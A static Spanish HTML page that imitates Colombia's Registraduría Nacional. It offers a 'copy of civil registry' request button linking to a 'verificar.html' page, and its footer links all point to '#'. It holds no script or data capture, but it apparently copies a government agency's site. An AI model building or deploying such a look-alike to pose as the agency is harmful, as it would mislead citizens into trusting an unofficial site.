<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consultar - Registraduría Nacional</title>
    <style>
        /* Variables de color basadas en el index */
        :root {
            --bg-global: #EAF8F8; 
            --bg-white: #FFFFFF;  
            --text-blue: #1B365D; 
            --text-gray: #666666;
            --btn-blue: #002A54;  
            --footer-dark: #001A33; 
            --footer-cyan: #00E5FF; 
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--bg-global);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 40px;
        }

        /* --- HEADER IDÉNTICO AL INDEX --- */
        .top-header-strip {
            background-color: var(--bg-white);
            width: 100%;
            display: flex;
            justify-content: center;
            padding: 20px 0;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }

        .top-header-strip img {
            max-width: 220px; 
            height: auto;
        }

        /* --- TARJETA CENTRAL --- */
        .card {
            background-color: var(--bg-white);
            width: 90%;
            max-width: 600px; /* Un poco más angosta para que se vea como ventana */
            border-radius: 30px;
            padding: 40px 50px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
            text-align: left;
            margin-top: 20px;
        }

        .card h2 {
            color: var(--text-blue);
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 25px;
        }

        /* Sub-tarjeta del trámite */
        .tramite-box {
            border: 1px solid #D1D1D1;
            border-radius: 20px;
            padding: 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 20px;
        }

        /* Icono circular */
        .icon-circle {
            background-color: #002A54;
            width: 70px;
            height: 70px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .icon-circle svg {
            width: 35px;
            height: 35px;
            fill: none;
            stroke: #00E5FF;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        /* Contenido de texto y botón */
        .tramite-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center; 
            text-align: center;
        }

        .tramite-info h3 {
            color: var(--text-blue);
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .btn-solicitar {
            background-color: transparent;
            color: var(--text-blue);
            border: 2px solid var(--text-blue);
            border-radius: 25px;
            padding: 10px 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }

        .btn-solicitar:hover {
            background-color: var(--text-blue);
            color: white;
        }

        /* --- FOOTER --- */
        .footer {
            background-color: var(--footer-dark);
            color: white;
            width: 100%;
            display: flex;
            flex-direction: column;
            margin-top: auto; 
        }

        .footer-institutional {
            background-color: var(--footer-cyan);
            color: var(--footer-dark);
            padding: 15px 30px;
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .footer-institutional img {
            max-width: 120px; 
            height: auto;
        }

        .footer-institutional span {
            font-weight: bold;
            font-size: 16px;
        }

        .footer-content {
            padding: 30px;
            display: flex;
            flex-direction: column;
            gap: 15px;
            font-size: 14px;
        }

        .footer-content a, 
        .footer-content p {
            color: white;
            text-decoration: none;
            margin: 0;
        }

        .footer-content a:hover {
            text-decoration: underline;
        }

        /* Adaptación para Computadora */
        @media (min-width: 768px) {
            .footer {
                flex-direction: row; 
                align-items: stretch;
            }
            .footer-institutional {
                flex-direction: column; 
                justify-content: center;
                min-width: 250px;
            }
            .footer-institutional img {
                max-width: 150px; 
                margin-bottom: 10px;
            }
            .footer-content {
                flex-direction: row; 
                justify-content: space-around;
                flex: 1;
                padding: 40px;
            }
        }

        /* Adaptación para móvil */
        @media (max-width: 767px) {
            .card {
                padding: 30px 20px;
                border-radius: 20px;
                margin-bottom: 40px; 
            }
            .footer {
                margin-top: 20px; 
            }
            .tramite-box {
                flex-direction: column;
                text-align: center;
                padding: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        
        <!-- HEADER: Franja blanca con el logo image.png -->
        <div class="top-header-strip">
            <img src="image.png" alt="Registraduría Nacional">
        </div>

        <!-- Tarjeta Central de Consulta -->
        <div class="card">
            
            <!-- Título de la sección -->
            <h2>Trámites disponibles</h2>

            <!-- Ventana del trámite -->
            <div class="tramite-box">
                
                <!-- Icono -->
                <div class="icon-circle">
                    <svg viewBox="0 0 24 24">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                </div>

                <!-- Texto y botón de acción -->
                <div class="tramite-info">
                    <h3>Copia de registro civil</h3>
                    <!-- Redirige a verificar.html -->
                    <a href="verificar.html" class="btn-solicitar">Solicitar copia</a>
                </div>

            </div>
        </div>

    </div>

    <!-- FOOTER idéntico al index -->
    <footer class="footer">
        <div class="footer-institutional">
            <img src="blanco.png" alt="Logo Institucional">
            <span>Institucional</span>
        </div>
        
        <div class="footer-content">
            <p>Av. Calle 26 n.° 51-50, CAN, Bogotá, Colombia. CP: 111321</p>
            <a href="#">Políticas de privacidad</a>
            <a href="#">Mapa del sitio</a>
            <a href="#">Normativa</a>
            <a href="#">Correo institucional</a>
            <a href="#">CEDAE (Datos para la democracia)</a>
        </div>
    </footer>

</body>
</html>
